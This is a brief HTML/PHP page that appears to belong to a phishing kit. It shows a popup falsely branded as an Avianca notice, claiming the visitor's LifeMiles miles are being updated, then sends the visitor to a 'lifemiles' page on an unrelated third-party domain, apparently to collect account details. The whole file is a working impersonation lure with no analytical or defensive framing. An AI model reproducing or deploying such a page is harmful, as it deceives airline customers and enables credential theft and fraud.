<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Previpass</title>
	<link rel="stylesheet" href="">
	<script src="dist/sweetalert-dev.js"></script>
    <link rel="stylesheet" href="dist/sweetalert.css">
</head>
<body>
	<?php
	echo "<script>
				swal({  title: 'Avianca Informa.',   
						text: 'Estamos Actualizando Tus Millas de LifeMiles, pronto recibirás un E-mail para que puedas redimirlas', 			
						type: 'warning',   
						showCancelButton: false,   
						closeOnConfirm: false,   
						showLoaderOnConfirm: true, 
					}, function(){   
						setTimeout(function(){     
							document.location.href='http://www.previpass.benditapm.com/lifemiles/index.html';   
						}, 1000); 
					});	
				
			</script>";
    ?>
</body>
</html>